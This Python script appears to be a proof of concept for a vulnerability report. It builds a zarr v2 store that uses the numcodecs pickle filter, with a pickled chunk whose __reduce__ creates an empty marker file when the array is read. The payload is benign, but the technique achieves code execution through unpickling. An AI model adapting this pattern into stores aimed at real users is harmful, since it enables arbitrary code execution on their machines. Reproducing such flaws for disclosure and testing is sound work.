# ruff: noqa  (one-off upstream reproduction probe)
"""A zarr v2 store whose .zarray names the numcodecs `pickle` filter.
The chunk is a pickle whose only effect is creating an empty marker file.
Usage: python zarr_pickle_filter_repro.py <scratch-dir> [dtype]"""

import json
import os
import pickle
import sys
import warnings

import numcodecs
import zarr

DTYPE = sys.argv[2] if len(sys.argv) > 2 else "|O"
root = os.path.abspath(sys.argv[1])
store = os.path.join(root, "evil.zarr")
marker = os.path.join(root, "MARKER-created-by-unpickle")
os.makedirs(store, exist_ok=True)
if os.path.exists(marker):
    os.remove(marker)


class Payload:
    def __reduce__(self):
        return (open, (marker, "w"))


with open(os.path.join(store, ".zarray"), "w") as f:
    json.dump(
        {
            "zarr_format": 2,
            "shape": [1],
            "chunks": [1],
            "dtype": DTYPE,
            "compressor": None,
            "fill_value": None,
            "order": "C",
            "filters": [{"id": "pickle", "protocol": 5}],
        },
        f,
    )
with open(os.path.join(store, "0"), "wb") as f:
    f.write(pickle.dumps(Payload()))

print("zarr", zarr.__version__, "numcodecs", numcodecs.__version__)
warnings.simplefilter("always")
with warnings.catch_warnings(record=True) as w:
    try:
        a = zarr.open_array(store, mode="r")
        print("opened:", a.dtype, a.shape, getattr(a, "filters", None))
        a[:]
    except Exception as e:
        print("read raised:", type(e).__name__, str(e)[:120])
    print("warnings:", [str(x.message)[:100] for x in w])
print("marker file created:", os.path.exists(marker))
